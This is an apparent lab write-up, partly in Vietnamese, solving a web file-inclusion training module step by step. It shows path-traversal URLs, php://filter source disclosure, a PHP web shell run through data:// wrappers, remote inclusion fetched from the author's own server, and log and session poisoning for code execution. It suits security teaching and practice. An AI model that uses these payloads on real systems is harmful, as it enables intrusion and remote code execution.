# Local File Inclusion (LFI)

#### Questions

+ 0  Using the file inclusion find the name of a user on the system that starts with "b".

```url
http://94.237.60.55:49722/index.php?language=../../../../etc/passwd
```

+ 1  Submit the contents of the flag.txt file located in the /usr/share/flags directory.

```url
http://94.237.60.55:49722/index.php?language=../../../../usr/share/flags/flag.txt
```

# Basic Bypasses

#### Questions
+ 1  The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt

```url
http://94.237.51.163:39103/index.php?language=languages/..././..././..././..././etc/passwd
```


# PHP Filters

#### Questions
+ 1  Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer

FUZZING file:

```zsh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://94.237.60.55:53128/FUZZ.php
```

```
configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 257ms]
```

Try to get content of `configure.php`

![](images/1.png)

We need to use php base64 filter

```url
http://94.237.60.55:53128/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```

![](images/2.png)

# PHP Wrappers

#### Questions
+ 1  Try to gain RCE using one of the PHP wrappers and read the flag at /

Get config file

```zsh
curl "http://94.237.60.55:41765/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

![](images/3.png)

Prepare payload

```zsh
echo '<?php system($_GET["cmd"]); ?>' | base64 -w 0
```

Url encoded

```
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D
```

Test payload

```zsh
curl 'http://94.237.60.55:41765/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

Get flag

```zsh
curl 'http://94.237.60.55:41765/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt' | grep 'HTB{'
```


# Remote File Inclusion (RFI)
#### Questions
+ 1  Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /

Set up payload

```zsh
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Test RFI

```zsh
curl http://10.129.29.114/index.php?language=http://10.10.14.210/
```

Confirm this has RFI

![](images/4.png)

Maybe our payload filtered

![](images/5.png)

Try ftp

```zsh
sudo python3 -m pyftpdlib -u test -P test -p 21
```

```url
http://10.129.29.114/index.php?language=ftp://test:test@10.10.14.210/shell.php&cmd=cat%20/exercise/flag.txt
```

# LFI and File Uploads

#### Questions
+ 1  Use any of the techniques covered in this section to gain RCE and read the flag at /

```zsh
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

![](images/6.png)

Get flag

```url
http://94.237.61.242:39984/index.php?language=./profile_images/shell.gif&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt
```

# Log Poisoning

#### Questions
+ 0  Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd

Checking log file: `http://94.237.54.192:42743/index.php?language=/var/log/apache2/access.log`

![](images/7.png)

Inject payload

```request
GET /index.php?language=/var/log/apache2/access.log HTTP/1.1

Host: 94.237.120.202:46793

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: <?php system($_GET['cmd']); ?>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Cookie: PHPSESSID=dft34mgl836cmbva0iq5mabo3j

Connection: keep-alive
```

```
GET /index.php?language=/var/log/apache2/access.log&cmd=pwd
```

![](images/8.png)

+ 1  Try to use a different technique to gain RCE and read the flag at /

PHP Session Poisoning
Testing payload

```burpsuite
GET /index.php?language=test_session_poisoning HTTP/1.1
```

My cookie:

```cookie
PHPSESSID=dft34mgl836cmbva0iq5mabo3j
```

So our file must be `/var/lib/php/sessions/sess_dft34mgl836cmbva0iq5mabo3j`

```burpsuite
GET /index.php?language=/var/lib/php/sessions/sess_dft34mgl836cmbva0iq5mabo3j HTTP/1.1
```

![](images/9.png)

Inject payload

```php
<?php system($_GET["cmd"]); ?>
```

 We need to encode our payload as url, just select then `ctrl + U` in `burpsuite`

![](images/10.png)

Confirm payload works

```burpsuite
GET /index.php?language=/var/lib/php/sessions/sess_dft34mgl836cmbva0iq5mabo3j&cmd=id HTTP/1.1
```

![](images/11.png)

```burp
GET /index.php?language=<%3fphp+system($_GET["cmd"])%3b+%3f> HTTP/1.1
```

```burp
GET /index.php?language=/var/lib/php/sessions/sess_dft34mgl836cmbva0iq5mabo3j&cmd=cat%20%2fc85ee5082f4c723ace6c0796e3a3db09.txt HTTP/1.1
```

# Automated Scanning

#### Questions
+ 1  Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt

Fuzzing parameter

```zsh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.253.59:43379/index.php?FUZZ=value' -fs 2309
```

```
view                    [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 220ms]
```

Fuzzing with LFI wordlist

```zsh
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://83.136.253.59:43379/index.php?view=FUZZ' -fs 1935
```

![](images/12.png)

Get flag.txt
```url
http://83.136.253.59:43379/index.php?view=../../../../../../../../../../../../../../../../../flag.txt
```


# File Inclusion Prevention

#### Questions

+ 0  What is the full path to the php.ini file for Apache?

```zsh
find / -type f -name 'php.ini' 2> /dev/null

/etc/php/7.4/cli/php.ini
/etc/php/7.4/apache2/php.ini
```


+ 0  Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for ________ reasons.

Tùy cách mỗi người, tôi dùng trình soạn thảo `nano`, tại nano dùng `Crtl W` sau đó tìm từ khóa `disable_functions`

![](images/13.png)

Thêm `system` vào trong biến này

![](images/14.png)

Tiếp đó lưu lại file và tạo một reverse shell ở /var/www/html

```zsh
htb-student@lfi-harden:/var/www/html$ cat shell.php 
<?php system($_GET["cmd"]); ?>
```

```zsh
sudo service apache2 restart
```

```zsh
http://10.129.124.163/shell.php?cmd=ls
```

```zsh
cat /var/log/apache2/error.log
```

![](images/15.png)

# Skills Assessment - File Inclusion

---

## Scenario

The company `INLANEFREIGHT` has contracted you to perform a web application assessment against one of their public-facing websites. They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application checking for file inclusion and path traversal vulnerabilities.

Find the vulnerabilities and submit a final flag using the skills we covered in the module sections to complete this module.

Don't forget to think outside the box!

#### Questions
+ 2  Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

Có vẻ như tham số mà có thể bị LFI là `page`

![](images/16.png)

Để chắc chắn không bỏ lỡ tôi sẽ vẫn kiểm tra tự động với ffuf

```zsh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.55.43:53744/index.php?FUZZ=value' -fs 15829
```

Có vẻ chỉ có tham số `page`

![](images/17.png)

Có lẽ trang web có bộ lọc, ta sẽ thử bypass

![](images/18.png)

Sau khi test các payload thì có vẻ php filters có thể dùng được

```url
http://94.237.55.43:53744/index.php?page=php://filter/read=convert.base64-encode/resource=about
```

![](images/19.png)

Tiếp tục tìm kiếm, ta chắc chắn rằng webroot của trang này là `/var/www/html`

![](images/20.png)

Kết quả test cũng cho thấy nó sẽ tự động thêm extension `.php` ở cuối

```url
http://94.237.55.43:53744/index.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/index
```

Khác với

```url
http://94.237.55.43:53744/index.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php
```

Tôi đã thử rất nhiều phương thức bypass tuy nhiên có vẻ không khả thi, như thể ta chỉ có thể đọc các file trong webroot vậy. Do đó fuzzing là một nước đi khả quan

```zsh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u 'http://94.237.55.43:53744/index.php?page=php://filter/read=convert.base64-encode/resource=FUZZ' -fs 4322,4521
```

Tôi đã tìm thấy vài thứ ở đây

![](images/21.png)

![](images/22.png)

Có vẻ không có gì hấp dẫn, tôi sẽ quay trở lại đọc source code của các file có sẵn, liệu có đường dẫn ẩn nào không?

```zsh
cat index_base64 | base64 -d > index.php
```

Ở đây có một đường dẫn khá thú vị

![](images/23.png)

Chúng ta sẽ khám phá `/ilf_admin`

```zsh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://94.237.55.43:53744/index.php?page=ilf_admin/FUZZ' -fs 4322,4521
```

Không có page nào khác.

Ghé thăm `ilf_admin/index`

![](images/24.png)

Click vào bất kì đường link nào chúng ta sẽ được chuyển đến một `Admin Panel` và có vài thứ hay ho ở đây là `logs`

![](images/25.png)

Tiếp tục brute LFI path với tham số `log=FUZZ`

```zsh
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.55.43:53744/ilf_admin/index.php?log=FUZZ' -fs 2046
```

![](images/26.png)

Chúng ta hoàn toàn có thể đọc file và kết thúc mọi thứ ở đây

![](images/27.png)

Bây giờ điều cần thiết là làm sao để có thể Remote Code Execution

Chúng ta sẽ thử với `PHP wrappers` như `data://` hoặc `input://`

![](images/28.png)

Đều không khả thi, do vậy `Poision Logs` là phương án khả thi nhất

Chúng ta biết rằng server đang chạy trên `nginx` qua thông tin có trong `/etc/passwd`

Chúng ta sẽ tải xuống LFI wordlist cho Linux, sau đó lọc ra `nginx`

```zsh
wget https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux

cat LFI-WordList-Linux | grep nginx > nginx_paths
```

```zsh
ffuf -w nginx_paths:FUZZ -u http://94.237.61.242:46669/ilf_admin/index.php?log=../../../../../FUZZ
```

![](images/29.png)

`access.log`

```url
http://94.237.61.242:46669/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log
```

![](images/30.png)

Tiếp đến, tiến hành poision log

```request
GET /ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log HTTP/1.1

Host: 94.237.54.192:36964

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: posioning log testttt

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Connection: keep-alive
```

![](images/31.png)

Điều này có thể sẽ không thành công ngay trong lần đầu, hãy thử reset lại lab và thử lại

Tiếp theo chúng ta sẽ tải lên payload

```request
GET /ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log&cmd=id HTTP/1.1

Host: 94.237.54.192:36964

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Connection: keep-aliv
```


![](images/32.png)

Get flag

```request
GET /ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log&cmd=cat%20%2fflag_dacc60f2348d.txt
```

![](images/33.png)